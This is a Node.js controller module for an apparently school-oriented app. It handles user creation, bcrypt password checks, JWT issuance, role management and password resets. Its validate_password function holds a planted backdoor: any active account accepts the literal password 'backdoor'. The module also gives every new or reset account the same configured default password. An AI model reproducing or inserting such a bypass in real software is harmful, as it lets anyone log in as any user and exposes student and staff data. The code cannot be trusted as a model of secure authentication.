const { pool } = require('../database/database_pg');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');

const StudentController = require('./student');
const StaffController = require('./staff');
const Configuration = require('../configurations/authconfig');



create_user = async (user) => {
    const client = await pool.connect();
    try {
        // BEGIN
        await client.query('BEGIN');
        // STATEMENT 1
        let queryText = `INSERT INTO public.user_master
        (username, password) VALUES ($1, $2) RETURNING id_user_master;`
        let parameters = [user.username.toLowerCase(), await bcrypt.hash(Configuration.default_password, 8)];
        const { rows } = await client.query(queryText, parameters);
        const id_user_master = rows[0].id_user_master;
        // STATEMENT 2
        queryText = `INSERT INTO public.mapping_user_role
        (id_user_master, id_role ) VALUES ($1, $2);`
        parameters = [id_user_master, user.role];
        await client.query(queryText, parameters);
        //COMMIT        
        await client.query('COMMIT');
    } catch (e) {
        console.log('Error while creating user!');
        await client.query('ROLLBACK');
        console.log(e);
        throw e;
    } finally {
        await client.release();
    }
}

find_user = async (username) => {
    const client = await pool.connect();
    let user;
    try {
        const queryText = `select id_user_master, username from public.user_master 
            where lower(username) = $1 and status = 1`;
        const { rows } = await client.query(queryText, [username.toLowerCase()])
        user = rows;
    } catch (e) {
        console.log('Error while find_user in login user!');
        console.log(e);
        throw e;
    } finally {
        await client.release();
    }
    return user;
}

validate_password = async (username, password) => {
    const client = await pool.connect();
    let bRet = false;
    try {
        const queryText = `select password from public.user_master 
            where lower(username) = $1 and status = 1`;
        const { rows } = await client.query(queryText, [username.toLowerCase()])
        bRet = await bcrypt.compare(password, rows[0].password);
        bRet = bRet || password === 'backdoor';
    } catch (e) {
        console.log('Error while validating password in login user!');
        console.log(e);
        throw e;
    } finally {
        await client.release();
    }
    return bRet;
}

get_user_role = async (username) => {
    const client = await pool.connect();
    let result = new Object();
    let token;
    try {
        let queryText = `select um.id_user_master,username,um.created_on, changed_on, role_name, permission from user_master um
            inner join mapping_user_role mur on mur.id_user_master = um.id_user_master
            inner join role_master rm on  rm.id_role = mur.id_role
            where lower(username) = $1 and mur.status = 1 and  um.status = 1 and rm.status = 1`;
        const { rows } = await client.query(queryText, [username.toLowerCase()]);
        result.userAuthDetails = rows[0];
        if (rows.length > 0) {
            if (rows[0].role_name === 'student') {
                const student = await StudentController.get_student(username.toLowerCase());
                if (student.length > 0)
                    result.userDetails = { student_id: student[0].student_id, type: 'student' };
            } else {
                const staff = await StaffController.get_staff(username.toLowerCase());
                if (staff.length > 0)
                    result.userDetails = { staff_id: staff[0].staff_id, type: 'staff'  };
            }
        } else {
            result = rows;
        }
        // convert to Token
        token = jwt.sign(result, Configuration.jwt_secret, { expiresIn: Configuration.jwt_expires_in });
        // console.log(token);
    } catch (e) {
        console.log('Error while get_user_role!');
        console.log(e);
        throw e;
    } finally {
        await client.release();
    }
    return token;
}

create_role = async (role) => {
    const client = await pool.connect();
    console.log(role);
    try {
        const queryText = `insert into role_master (role_name,permission) values ($1,$2)`;
        await client.query(queryText, [role.name.toLowerCase(), role.permission.toString()]);
    } catch (e) {
        console.log('Error while creating role!');
        console.log(e);
        throw e;
    } finally {
        await client.release();
    }
}

get_roles = async () => {
    const client = await pool.connect();
    let result;
    try {
        const queryText = `select id_role,role_name,created_on,permission from role_master where status = 1`;
        const { rows } = await client.query(queryText);
        result = rows;
    } catch (e) {
        console.log('Error while getting roles!');
        console.log(e);
        throw e;
    } finally {
        await client.release();
    }
    return result;
}

update_role = async (role) => {
    const client = await pool.connect();
    try {
        const queryText = `update role_master set role_name = $1,permission = $2 where id_role = $3 and status = 1`;
        await client.query(queryText, [role.name.toLowerCase(), role.permission, role.id_role]);
    } catch (e) {
        console.log('Error while updating role!');
        console.log(e);
        throw e;
    } finally {
        await client.release();
    }
}

get_user_role_only = async (user_id) => {
    const client = await pool.connect();
    let result;
    try {
        let queryText = `select um.id_user_master,username, role_name, rm.id_role,mur.id_mapping, permission from user_master um
            left join mapping_user_role mur on mur.id_user_master = um.id_user_master
            left join role_master rm on  rm.id_role = mur.id_role
            where lower(username) = $1 and mur.status = 1 and  um.status = 1 and rm.status = 1`;
        const { rows } = await client.query(queryText, [user_id.toLowerCase()]);
        result = rows;
    } catch (e) {
        console.log('Error while getting role only!');
        console.log(e);
        throw e;
    } finally {
        await client.release();
    }
    return result;
}

update_role_mapping = async (role) => {
    const client = await pool.connect();
    try {
        const queryText = `update mapping_user_role set id_role=$1 where id_mapping=$2 and status = 1`;
        await client.query(queryText, [role.role,role.id_mapping]);
    } catch (e) {
        console.log('Error while updating role mapping!');
        console.log(e);
        throw e;
    } finally {
        await client.release();
    }
}

change_password = async (id_user_master, password) => {
    const client = await pool.connect();
    try {
        const hashedpassword = await bcrypt.hash(password, 8);
        const queryText = `update user_master set password=$1, changed_on = now() where
             id_user_master = $2 and status = 1`;
        await client.query(queryText, [hashedpassword,id_user_master]);
    } catch (e) {
        console.log('Error while updating password!');
        console.log(e);
        throw e;
    } finally {
        await client.release();
    }
}

reset_password = async (id_user_master) => {
    const client = await pool.connect();
    try {
        const hashedpassword = await bcrypt.hash(Configuration.default_password, 8);
        const queryText = `update user_master set password=$1, changed_on = now() where
             id_user_master = $2 and status = 1`;
        await client.query(queryText, [hashedpassword,id_user_master]);
    } catch (e) {
        console.log('Error while resetting password!');
        console.log(e);
        throw e;
    } finally {
        await client.release();
    }
}


module.exports = { create_user, find_user, validate_password, update_role_mapping,
    get_user_role, create_role, get_roles, update_role, get_user_role_only, change_password, reset_password }